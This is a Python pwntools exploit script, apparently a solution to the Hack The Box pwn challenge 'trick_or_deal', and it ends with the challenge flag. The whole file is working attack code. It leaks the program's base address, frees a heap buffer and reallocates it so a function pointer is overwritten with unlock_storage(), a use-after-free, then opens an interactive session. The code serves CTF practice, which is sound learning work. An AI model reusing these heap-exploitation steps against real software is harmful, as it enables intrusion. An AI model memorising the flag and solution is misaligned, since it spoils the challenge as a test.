#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('trick_or_deal')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("1.1.1.1", 32430)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break make_offer
breakrva 0x1106
continue
'''.format(**locals())

# Leak base of exe
io = start()
io.recvuntil(b"to do? ")
io.sendline(b"2")
io.recvuntil(b"do you want!!? ")
io.sendline(b"A"*8)
io.recvline()
io.recvline()

leak = io.recvline().hex()
log.info('Full leak: ' + leak)
exe_base = int(leak[:-2], 16)
exe_base = int(p64(exe_base).hex(), 16) 
exe_base = (exe_base >> 16) - 0x1500
log.info('Base of exe: ' + hex(exe_base))

unlock_storage = exe_base + 0xeff
payload = b"A"*0x48 + p64(unlock_storage)

# Free storage buffer
log.info("Freeing buffer...")
io.recvuntil(b"to do? ")
io.sendline(b"4")

# Alloc new heap buffer and write func addr to offset 0x48
log.info("Allocating new buffer...")
io.recvuntil(b"to do? ")
io.sendline(b"3")
io.recvuntil(b"make an offer(y/n): ")
io.sendline(b"y")
io.recvuntil(b"to be? ")
log.info("Writing addr of unlock_storage() to new buffer...")
io.sendline(b"84")
io.recvuntil(b"offer me? ")
io.sendline(payload)

# Trigger func
log.info("Calling unlock_storage()")
io.recvuntil(b"to do? ")
io.sendline(b"1")

io.interactive()

# HTB{tr1ck1ng_d3al3rz_f0r_fUn_4nd_pr0f1t}
